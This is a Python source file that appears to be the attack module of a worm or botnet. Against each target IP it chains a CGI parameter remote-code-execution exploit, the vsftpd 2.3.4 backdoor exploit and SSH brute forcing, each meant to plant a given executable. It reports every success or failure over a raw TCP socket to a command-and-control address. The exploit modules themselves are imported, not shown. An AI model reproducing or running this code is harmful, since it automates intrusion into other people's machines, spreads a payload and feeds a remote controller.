from RCEs.http_cgi_parm_exploit import *
import socket
import BruteForceSSH
import RCEs.vsftpd_234_exploit

global status
global BruteForceSSH_var
BruteForceSSH_var = None
status = False
def attack(ip,cnc_ip,cnc_port,executable,send,prnt):
	global status
	status = True
	ret = cgi_exploit(ip,80,cnc_ip,executable)
	if ret:
		send_msg("cgi parm exploit sent to %s" % (ip),cnc_ip,cnc_port,prnt)
		return
	elif send:
		send_msg("cgi exploit failed on %s" % (ip),cnc_ip,cnc_port,prnt)
	if not status and send:
		send_msg("attack ended on %s"%(ip),cnc_ip,cnc_port,prnt)
		return
	ret = RCEs.vsftpd_234_exploit.exploit(ip, 21,cnc_ip,executable)
	if ret:
		send_msg("vsftpd exploit sent to on %s" % (ip),cnc_ip,cnc_port,prnt)
		return
	elif send:
		send_msg("vsftpd exploit failed on %s" % (ip),cnc_ip,cnc_port,prnt)
	if not status and send:
		send_msg("attack ended on %s"%(ip),cnc_ip,cnc_port,prnt)
		return
	global BruteForceSSH_var
	BruteForceSSH_var = BruteForceSSH
	ret = BruteForceSSH_var.brute_force(ip,executable)
	if ret:
		send_msg("brute force succeded on %s" % (ip),cnc_ip,cnc_port,prnt)
		return
	elif send:
		send_msg("brute force failed on %s" % (ip),cnc_ip,cnc_port,prnt)
	if not status and send:
		send_msg("attack ended on %s"%(ip),cnc_ip,cnc_port,prnt)
		return
	if send:
		send_msg("attack failed on %s"%(ip),cnc_ip,cnc_port,prnt)
	return
		
def send_msg(msg,cnc_ip,cnc_port,prnt):
		if prnt:
			print(msg)
			return
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((cnc_ip, int(cnc_port)))
		sock.send(msg.encode())
		sock.close()
		
def stop():
	global status
	status = False
	if BruteForceSSH_var:
		BruteForceSSH_var.stop()
	#print("stopped")
		
